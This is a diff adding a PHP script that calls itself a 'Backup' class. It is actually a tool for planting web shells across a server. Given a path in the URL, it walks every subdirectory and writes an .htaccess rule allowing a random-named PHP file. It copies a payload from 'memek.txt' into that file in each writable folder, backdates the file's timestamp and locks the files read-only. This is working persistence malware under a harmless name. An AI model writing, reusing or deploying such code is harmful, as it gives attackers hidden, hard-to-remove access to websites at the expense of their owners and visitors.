@@ -1,0 +1,76 @@
+<?php
+
+class Backup {
+
+    function recursive_directory($dir) {
+        $tree = glob(rtrim($dir, '/') . '/*');
+        $isDirectory = false;
+
+        foreach ($tree as $sc) {
+            if (is_dir($sc)) {
+                $isDirectory = true;
+                $this->recursive_directory($sc);
+            }
+        }
+
+        if (!$isDirectory && is_writable($dir)) {
+            $random_name = mt_rand();
+            $htaccessPath = $dir . "/.htaccess";
+
+            // Pastikan file .htaccess ada atau buat file baru jika tidak ada
+            if (!file_exists($htaccessPath)) {
+                file_put_contents($htaccessPath, '');
+            }
+
+            // Ubah izin file .htaccess jika tidak dapat ditulis
+            if (!is_writable($htaccessPath)) {
+                chmod($htaccessPath, 0644);
+            }
+
+            // Aturan .htaccess yang dimasukkan
+            $ht = '<FilesMatch "^(' . $random_name . '.php|index.php|index.html)$">
+Order allow,deny
+Allow from all
+</FilesMatch>'
+;
+
+            // Tulis ke file .htaccess
+            $htaccessFile = fopen($htaccessPath, "w");
+            if ($htaccessFile) {
+                fwrite($htaccessFile, $ht);
+                fclose($htaccessFile);
+            }
+
+            // Cek apakah file "memek.txt" ada
+            $contentFilePath = "memek.txt";
+            if (file_exists($contentFilePath)) {
+                $content = file_get_contents($contentFilePath);
+                file_put_contents($dir . "/" . $random_name, $content);
+                rename($dir . "/" . $random_name, $dir . "/" . $random_name . ".php");
+                if (file_exists($dir . "/" . $random_name)) {
+                    unlink($dir . "/" . $random_name);
+                }
+                touch($dir . "/" . $random_name . '.php', strtotime('2022-01-14 06:30:55'));
+                chmod($dir . "/" . $random_name . '.php', 0444);
+                chmod($htaccessPath, 0444);
+                echo "Success Backup : " . $dir . "/" . $random_name . ".php<br>";
+            } else {
+                echo "File 'memek.txt' tidak ditemukan.<br>";
+            }
+        }
+    }
+}
+
+if (isset($_GET['path'])) {
+    $path = filter_input(INPUT_GET, 'path', FILTER_SANITIZE_STRING);
+    if ($path && is_dir($path)) {
+        $instance = new Backup();
+        $instance->recursive_directory($path);
+    } else {
+        echo "Path tidak valid atau tidak ditemukan.<br>";
+    }
+} else {
+    echo "Path tidak diset.<br>";
+}
+
+?>
